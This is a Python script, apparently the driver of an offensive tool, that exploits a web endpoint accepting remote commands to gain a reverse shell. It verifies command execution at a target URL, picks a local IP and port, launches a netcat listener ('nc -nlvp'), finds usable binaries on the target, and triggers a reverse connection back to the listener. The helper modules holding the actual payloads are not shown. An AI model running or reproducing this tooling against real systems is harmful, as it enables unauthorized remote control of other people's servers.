import argparse
import subprocess

import psutil

from modules import commands, connection, flags, local

parser = argparse.ArgumentParser()
parser = flags.setup(parser)
results = parser.parse_args()
flags.splash()
if not results.force:
    print("Verifying commands can be executed...")
    if not commands.verify(results.url):
        print("System does not seem to be accepting commands. You can ignore this with --force True")
        quit()
if results.ip is None and results.port is None:
    ip = connection.get_ip(psutil.net_if_addrs(), results.interface)
    port = connection.get_port(ip)
    if port < 1:
        print("No ports available.")
        quit()
    if results.nc is not None:
        nc = results.nc
    else:
        print("Finding local nc binary...")
        nc = local.find_nc()
    if nc is None:
        print("nc not found. Please specify the path to it with --nc /path/to/bin")
        quit()
    print(f"nc target at {nc}")
    p = subprocess.Popen(f"{nc} -nlvp {port}".split(" "), start_new_session=True)
else:
    ip = results.ip
    port = results.port
print(f"Final connection string will be {ip}:{port}...")
print("Finding bins...")
bins = commands.find_bins(results.url)
if len(bins) < 1:
    print("No valid bins found.")
    quit()
print("Executing reverse shell...")
commands.reverse_connection(bins, results.url, ip, port)
